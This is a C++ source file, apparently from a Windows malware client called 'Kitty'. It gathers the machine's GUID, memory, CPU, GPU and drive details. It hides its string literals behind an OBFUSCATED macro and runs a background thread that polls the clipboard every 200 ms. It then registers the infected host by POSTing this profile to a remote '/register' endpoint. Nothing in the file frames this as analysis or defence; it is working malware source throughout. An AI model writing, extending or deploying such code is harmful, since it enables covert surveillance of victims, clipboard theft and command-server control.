#include <kitty/client.h>
#include <kitty/socket.h>
#include <openssl/rand.h>
#include <kitty/log.h>

static MachineInfo GetMachineInfo()
{
	MachineInfo info{};

	if (!GetPhysicallyInstalledSystemMemory(&info.totalMemory))
		KittyLog(OBFUSCATED("Failed to get total system memory"), true);

	SYSTEM_INFO siSysInfo;
	GetSystemInfo(&siSysInfo);
	info.logicalProcessorCount = siSysInfo.dwNumberOfProcessors;

	for (int i = 0; i < 8; i++)
	{
		DISPLAY_DEVICE dd{ sizeof(dd), 0 };
		if (EnumDisplayDevicesA(NULL, i, &dd, EDD_GET_DEVICE_INTERFACE_NAME))
			strcpy_s(info.gpuDeviceString, dd.DeviceString);
		else
			break;
	}

	info.cpuDeviceString = GetProcessorName();
	info.drives = GetAvailableDrives();

	return info;
}

KittyClient::KittyClient()
{
	// Get machine information
	info = GetMachineInfo();
	clipboardThread = std::thread([](ClipboardEngine e) { e.Run(200); }, clipboardEngine);
}

KittyClient::~KittyClient()
{
	clipboardThread.join();
}

bool KittyClient::Register() const
{
	char guid[64];
	GetMachineGuid(guid);

	nlohmann::json map{};
	map[OBFUSCATED("guid")] = guid;
	map[OBFUSCATED("ram")] = info.totalMemory / 1024;
	map[OBFUSCATED("cpu_name")] = info.cpuDeviceString;
	map[OBFUSCATED("cpu_count")] = info.logicalProcessorCount;
	map[OBFUSCATED("gpu_name")] = info.gpuDeviceString;
	map[OBFUSCATED("drives")] = info.drives;
	return SendPost(OBFUSCATED("/register"), map);
}